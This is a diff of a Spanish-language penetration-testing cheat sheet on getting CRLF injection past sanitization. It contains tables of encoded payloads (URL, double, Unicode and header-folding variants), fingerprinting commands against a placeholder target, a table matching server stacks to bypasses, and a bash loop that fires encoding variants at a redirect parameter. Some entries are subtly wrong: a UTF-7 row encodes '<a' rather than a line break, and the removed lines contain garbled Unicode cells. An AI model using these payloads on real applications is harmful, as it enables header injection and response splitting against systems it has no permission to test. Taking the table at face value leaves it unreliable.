@@ -8,12 +8,12 @@ tags:
   - vuln/crlf-injection
   - technique/defense-evasion
   - asset/web-app
-primary categories:
-secondary categories:
-tertiary categories:
+primary categories: null
+secondary categories: null
+tertiary categories: null
 kind: SubCheatSheet
 linked:
-  - "[[CRLF Injection]]"
+  - '[[CRLF Injection]]'
 ---
 # CRLF Injection - Bypass de Sanitización
 
@@ -21,117 +21,82 @@ linked:
 
 ## URL Encoding Variants
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Single URL encoding | `%0d%0a` | Standard. |
-| LF only | `%0a` | Some servers tolerate sin CR. |
-| CR only | `%0d` | Less common. |
-| Mixed case hex | `%0D%0A` | Case bypass de regex. |
-| Long form Unicode | `%u000d%u000a` | Microsoft IIS-style. |
-| Short Unicode | `%u0a` | Edge. |
-| Encoded other reps | `\r\n` literal en JS contexts | Edge. |
-| HTML entity | `&#13;&#10;` | If reflected en HTML. |
-| Decimal HTML entity | `&#013;&#010;` | Padded. |
-| Hex HTML entity | `&#x0d;&#x0a;` | Hex variant. |
-| HTML5 encoding | `&NewLine;` | HTML5 named entity. |
-| JSON escape | `\\r\\n` (double escape) | If parsed as JSON first. |
-| Backslash escape | `\\r\\n` | Edge JS. |
-| Form-encoded | `+0d+0a` (uncommon) | Edge. |
-| CSV-style escape | `\r\n` literal | Edge. |
-| URL fragment | `#%0d%0a` (fragment NOT sent) | Edge — never works server-side. |
+| `%0d%0a` | CR+LF estándar URL-encoded | Probe baseline. |
+| `%0a` | LF solo | App acepta LF sin CR (mayoría de parsers HTTP). |
+| `%0d` | CR solo | Algunos parsers (poco frecuente). |
+| `%0D%0A` | Mayúsculas en hex | Bypass de regex case-sensitive `/%0d/`. |
+| `%u000d%u000a` | Unicode IIS-style | Apps legacy con IIS Url decoding. |
+| `&#13;&#10;` / `&#x0d;&#x0a;` / `&NewLine;` | HTML entities | El input se refleja en HTML antes de procesarse. |
+| `\r\n` literal (sin encoding) | Backend interpreta escape | El campo se procesa como JSON/JS string. |
+| `\\r\\n` | Doble-escape | Pipeline JSON→string→header. |
 ^crlfi-bypass-url
 
 ___
 
 ## Double Encoding
 
-| **Variant** | **Payload** | **Workflow** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Doble URL encoding | `%250d%250a` | Decoded once → `%0d%0a` → decoded again → `\r\n`. |
-| Mixed encoding | `%25%30%64%25%30%61` | Each char encoded twice. |
-| Triple encoding | `%25250d%25250a` | Multi-decode chains. |
-| URL-encoded slash | `%252F` (= `/`) similar concept | Edge. |
-| Combine con HTML entity | `%26%2313%3B%26%2310%3B` (= `&#13;&#10;`) | Multi-format. |
-| Backend decodes multiple times | If proxy + app each decode → atacante exploits | Standard chain. |
-| WAF only checks first decode | Bypass via multi-decode | Filter bypass. |
-| Browser → backend differential | Browser sends encoded, backend decodes | Standard. |
-| `+` instead of space | `+%0d%0aHeader` | URL form-encoded variant. |
-| Encoded chars to bypass list | URL-encoded `:` `;` etc | Multi-char encode. |
+| `%250d%250a` | Doble URL encoding (`%25` = `%`) | Proxy + app decodifican una vez cada uno. |
+| `%25250d%25250a` | Triple encoding | Cadena de 3 decoders (proxy + WAF + app). |
+| `%26%2313%3B%26%2310%3B` | URL-encoded HTML entity `&#13;&#10;` | App decodifica URL → HTML entity reflejada → backend procesa. |
+| `%E5%98%8A%E5%98%8D` | UTF-8 overlong/best-fit que mapea a CR/LF en algunos charsets | Apps Java/Tomcat con conversión Unicode laxa. |
+| `+%0d%0a` | `+` se decodifica como espacio + CRLF | Form-encoded con `application/x-www-form-urlencoded`. |
 ^crlfi-bypass-double
 
 ___
 
 ## Unicode / Charset Variants
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `
-` JS Unicode | `
-` (LF) | If JS context. |
-| `
-` JS | `
-` (CR) | Same. |
-| `\x0a` Hex literal | If interpreted | Edge. |
-| `\012` Octal | Octal LF | Edge. |
-| Vertical Tab | `%0b` (VT) | Some servers treat as line break. |
-| Form Feed | `%0c` (FF) | Same. |
-| NEL (Next Line, Unicode) | `%c2%85` (UTF-8) | Edge. |
-| Line Separator | ` ` U+2028 | JS only. |
-| Paragraph Separator | ` ` U+2029 | Same. |
-| UTF-7 | `+AAAd-+AAAa-` | Old browsers. |
-| UTF-16 BE/LE BOM | Byte order mark | Edge. |
-| Overlong UTF-8 | `%c0%8d%c0%8a` | Legacy parsers. |
-| Best-fit Unicode | `%c0%0a` (Microsoft best-fit) | Microsoft-specific. |
-| Punycode | `xn--...` | Edge. |
-| Mixed encoding | URL + Unicode + entity combined | Multi-layer. |
+| `%c2%85` | NEL (Next Line, U+0085) UTF-8 | Backend que tratea NEL como line break (Java legacy). |
+| `%e2%80%a8` | LINE SEPARATOR (U+2028) UTF-8 | Contexto JS — algunos parsers JS lo tratan como newline. |
+| `%e2%80%a9` | PARAGRAPH SEPARATOR (U+2029) UTF-8 | Mismo contexto que U+2028. |
+| `%0b` / `%0c` | VT (Vertical Tab) / FF (Form Feed) | Algunos servers HTTP-laxos lo procesan como separador. |
+| `%c0%8a` | UTF-8 overlong para LF (`0x0a`) | Parsers legacy sin validación overlong. |
+| `+ADw-+AGEA-` | UTF-7 encoding | IE legacy, parsers sin charset enforcement. |
 ^crlfi-bypass-unicode
 
 ___
 
 ## Server-Specific Quirks
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Comando de fingerprint** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Apache | Strict on CRLF en headers post-2009 | Mostly mitigated. |
-| nginx | Strict | Same. |
-| IIS / .NET | Older versions vulnerable to splitting | Patched modern. |
-| Tomcat | Some parsers laxer | Per-version. |
-| Jetty | Per-version | Edge. |
-| Node.js (raw http) | No splitting native | Stricter. |
-| PHP (raw header()) | Older versions vulnerable | Modern PHP rejects. |
-| Java Servlet | Per-container | Per-version. |
-| Express (Node.js) | Built-in protection (header validation) | Modern. |
-| Flask (Python) | Werkzeug rejects newlines | Modern. |
-| Custom RFC parsing | Edge framework laxer | Per-app. |
-| HAProxy | Strict reverse proxy | Mostly secure. |
-| Cloudflare | Strict at edge | Mostly. |
-| AWS ALB | Per-config | Mostly secure. |
-| Older PHP `header()` | Pre-5.4 vulnerable | Edge legacy. |
-| Custom CGI | Per-implementation | Per-stack. |
+| `curl -sI https://target \| grep -i server` | Identifica server (Apache/nginx/IIS/...) | Selección de encoding adecuado. |
+| `curl -sI -H 'X-Test: a\r\nb: c' https://target` | Test header con CRLF — modern frameworks rechazan | Detecta validación strict del framework. |
+| `whatweb https://target` | Fingerprint stack completo (Express/Flask/Django/etc.) | Backend-specific bypass selection. |
+| `nuclei -t http/technologies/ -u https://target` | Detección de tecnologías | Identifica versión vulnerable. |
 ^crlfi-bypass-server
+
+**Cuál bypass por stack:**
+
+| Stack | Bypass que suele funcionar |
+|---|---|
+| IIS / ASP.NET clásico | `%u000d%u000a` Unicode |
+| Apache 2.x (legacy) | `%0a` solo |
+| Tomcat/Jetty | UTF-8 overlong `%c0%8a` |
+| Node.js raw | Rechaza CRLF en header() — buscar concat manual |
+| PHP `header()` pre-5.4 | `%0a` solo |
+| Custom CGI | Doble encoding `%250d%250a` |
 
 ___
 
-## Header Folding (Obsolete pero Edge)
+## Header Folding (Obsolete pero edge)
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | RFC 822 originally allowed multi-line headers via leading whitespace continuation. RFC 7230 obsoleted. | Legacy. |
-| Folded continuation | `X-Header: value\r\n continued` | Some old parsers accept. |
-| Tab continuation | `\r\n\tcontinued` | Tab variant. |
-| Combine con strict reject | If app rejects `\r\n` but accepts folded format | Bypass. |
-| Multiple folded lines | `\r\n a\r\n b\r\n c` | Multi-line. |
-| Edge case modern | Most servers reject now | Defense. |
-| Tests against legacy | If targeting old apps / CGI | Per-target. |
-| Combine con HTTP/2 | H2 has different rules | Per-protocol. |
-| WebSphere / older Tomcat | More tolerant | Per-stack. |
-| Manual verification | curl --data-binary $'\r\n value' | Test. |
+| `X-Header:%20value%0d%0a%20continued` | Continuation line con espacio leading | RFC 822 folding — legacy CGI/Java. |
+| `X-Header:%20value%0d%0a%09continued` | Continuation con TAB | Misma idea, parser laxo. |
+| `%0d%0a%20Injected:%20bar` | Inyección como continuation del header anterior | Bypass de validación que solo rechaza CRLF estándar. |
 ^crlfi-bypass-folding
 
 ### Encoding bypass matrix
 
 ```bash
-# Iterate over encoding variants
 TARGET="https://target/redirect"
 PARAM="url"
 PROBE="X-CRLF-Probe:%20FOUND"
@@ -143,8 +108,9 @@ ENCODINGS=(
   '%250d%250a'     # Doble URL encoding
   '%E5%98%8A%E5%98%8D'  # UTF-8 best-fit
   '%u000d%u000a'   # IIS Unicode
-  '\r\n'           # Literal (some langs interpret)
-  '%0d%0aFoo:%20bar%0d%0a'  # Multiple
+  '%c2%85'         # NEL UTF-8
+  '%e2%80%a8'      # LINE SEPARATOR
+  '%c0%8a'         # UTF-8 overlong LF
 )
 
 for enc in "${ENCODINGS[@]}"; do
